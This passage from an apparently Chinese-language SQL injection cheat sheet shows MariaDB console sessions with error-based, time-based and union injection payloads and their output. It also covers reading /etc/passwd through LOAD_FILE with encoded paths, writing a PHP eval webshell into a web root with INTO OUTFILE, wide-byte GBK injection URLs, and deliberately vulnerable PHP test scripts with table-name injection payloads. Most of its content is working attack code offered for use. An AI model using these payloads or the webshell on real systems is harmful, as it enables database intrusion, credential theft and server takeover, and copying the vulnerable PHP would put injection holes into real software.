</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>LIMIT</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=w> </span><span class=k>procedure</span><span class=w> </span><span class=k>analyse</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=n>rand</span><span class=p>(),</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x3a</span><span class=p>,</span><span class=k>version</span><span class=p>())),</span><span class=mi>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1105</span><span class=w> </span><span class=p>(</span><span class=n>HY000</span><span class=p>):</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;:10.3.11-MariaDB&#39;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=group-by-注入>Group By 注入</h3><h4 id=报错注入-3>报错注入</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>GROUP</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>SELECT</span><span class=w> </span><span class=o>@@</span><span class=k>version</span><span class=p>),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1105</span><span class=w> </span><span class=p>(</span><span class=n>HY000</span><span class=p>):</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~10.3.11-MariaDB~&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>GROUP</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>from</span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=n>concat</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=o>@@</span><span class=k>version</span><span class=p>))</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=n>floor</span><span class=p>(</span><span class=n>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=n>a</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1062</span><span class=w> </span><span class=p>(</span><span class=mi>23000</span><span class=p>):</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=s1>&#39;10.3.11-MariaDB1&#39;</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>key</span><span class=w> </span><span class=s1>&#39;group_key&#39;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=延时注入-1>延时注入</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>GROUP</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>if</span><span class=p>(</span><span class=n>mid</span><span class=p>(</span><span class=k>user</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;r&#39;</span><span class=p>,</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>),</span><span class=mi>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>passwd</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>9</span><span class=p>.</span><span class=mi>150</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=union-注入-1>Union 注入</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>GROUP</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>passwd</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>hasaki</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=n>hasaki</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>666</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=mi>2333</span><span class=w>   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>4</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>000</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>GROUP</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>3</span><span class=p>,</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>passwd</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>000</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>GROUP</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=k>user</span><span class=p>(),</span><span class=mi>3</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>3</span><span class=p>,</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w>       </span><span class=o>|</span><span class=w> </span><span class=n>passwd</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>root</span><span class=o>@</span><span class=n>localhost</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>002</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=读写文件>读写文件</h3><p>利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。</p><p>查询用户读写权限：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>file_priv</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=k>user</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;root&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>首先查看变量确定权限</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>show</span><span class=w> </span><span class=n>variables</span><span class=w> </span><span class=k>like</span><span class=w> </span><span class=s1>&#39;%secure%&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><ul><li>当 secure_file_priv 为空，就可以读取磁盘的目录。</li><li>当 secure_file_priv 为G:\，就可以读取G盘的文件。</li><li>当 secure_file_priv 为 null，load_file 就不能加载文件。</li></ul><h4 id=load_file读取>load_file()读取</h4><p>条件</p><ul><li>需要有读取文件的权限</li><li>需要知道文件的绝对物理路径。</li><li>要读取的文件大小必须小于 max_allowed_packet</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>@@</span><span class=n>max_allowed_packet</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>直接使用绝对路径</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>LOAD_FILE</span><span class=p>(</span><span class=s2>&#34;/etc/passwd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>LOAD_FILE</span><span class=p>(</span><span class=nb>CHAR</span><span class=p>(</span><span class=mi>47</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>116</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>112</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>115</span><span class=p>,</span><span class=mi>115</span><span class=p>,</span><span class=mi>119</span><span class=p>,</span><span class=mi>100</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>LOAD_FILE</span><span class=p>(</span><span class=mi>0</span><span class=n>x2f6574632f706173737764</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=select-导出>SELECT 导出</h4><p>条件</p><ul><li>一般要指定绝对路径</li><li>需导出的目录有可写权限</li><li>要outfile出的文件不能已经存在</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>DATABASE</span><span class=p>()</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>OUTFILE</span><span class=w> </span><span class=s1>&#39;/tmp/test&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=写入-webshell>写入 WebShell</h4><p>条件</p><ul><li>需要知道网站的绝对物理路径，这样导出后的webshell可访问</li><li>对需导出的目录有可写权限。</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w>  </span><span class=s2>&#34;&lt;?php eval($_POST[&#39;a&#39;])?&gt;&#34;</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>OUTFILE</span><span class=w> </span><span class=s1>&#39;/var/www/html/shell.php&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=宽字节注入>宽字节注入</h3><h4 id=原理>原理</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>mysql_query</span><span class=p>(</span><span class=s2>&#34;SET NAMES &#39;gbk&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$name</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;SELECT * FROM test WHERE names=&#39;</span><span class=si>{</span><span class=nv>$name</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>addslashes()</code>会在单引号或双引号前加上一个<code>\</code>。当 mysql 使用 GBK 字符集时，会把两个字符当作一个汉字，如<code>%df%5c</code>为運字。我们输入<code>name=root%df%27</code>，<code>%</code>在服务器端会出现如下转换：<code>root%df%27</code> -> <code>root%df%5c%27</code> -> <code>root運'</code>。</p><p>更多内容可见：<a class=link href=https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html target=_blank rel=noopener>浅析白盒审计中的字符编码及SQL注入</a></p><h4 id=利用>利用</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>index.php?name=1%df&#39;
</span></span><span class=line><span class=cl>index.php?name=1%a1&#39;
</span></span><span class=line><span class=cl>index.php?name=1%aa&#39;
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>在被<code>addslashes</code>后，出现<code>%XX%5c</code>，当前一个字符的 ascii 码值大于 128 时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅<code>%df</code>可以吃掉<code>\</code>。</p><h3 id=表名可控注入>表名可控注入</h3><p>详细可参考<a class=link href=http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/ target=_blank rel=noopener>当表名可控的注入遇到了Describe时的几种情况</a></p><h4 id=表名不完全可控且desc的表名含有反引号select的表名不含反引号>表名不完全可控且DESC的表名含有反引号,SELECT的表名不含反引号</h4><p>test.php 代码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>mysql_connect</span><span class=p>(</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span><span class=s2>&#34;root&#34;</span><span class=p>,</span><span class=s2>&#34;123456&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>mysql_query</span><span class=p>(</span><span class=s2>&#34;use test&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$table</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;table&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nx>mysql_query</span><span class=p>(</span><span class=s2>&#34;desc `shop_</span><span class=si>$table</span><span class=s2>`&#34;</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;DESC 出错:&#34;</span><span class=o>.</span><span class=nx>mysql_error</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;select * from shop_</span><span class=si>$table</span><span class=s2> where 1=1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$sql</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>mysql_fetch_array</span><span class=p>(</span><span class=nx>mysql_query</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$sql</span><span class=s2>&#34;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>mysql_error</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p>payload :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>user` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23`
</span></span></code></pre></td></tr></table></div></div><p>shop_users 后面的两个``,做了shop_users 表的别名，所以无影响，不会进入 die。sql 语句才得以执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=o>``</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=p>()),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=o>#</span><span class=p>;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20190610007581.jpg loading=lazy></p><h4 id=表名不完全可控且desc的表名不含反引号select的表名含有反引号>表名不完全可控且DESC的表名不含反引号,SELECT的表名含有反引号</h4><p>test.php 源码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>mysql_connect</span><span class=p>(</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span><span class=s2>&#34;root&#34;</span><span class=p>,</span><span class=s2>&#34;123456&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>mysql_query</span><span class=p>(</span><span class=s2>&#34;use test&#34;</span><span class=p>);</span>
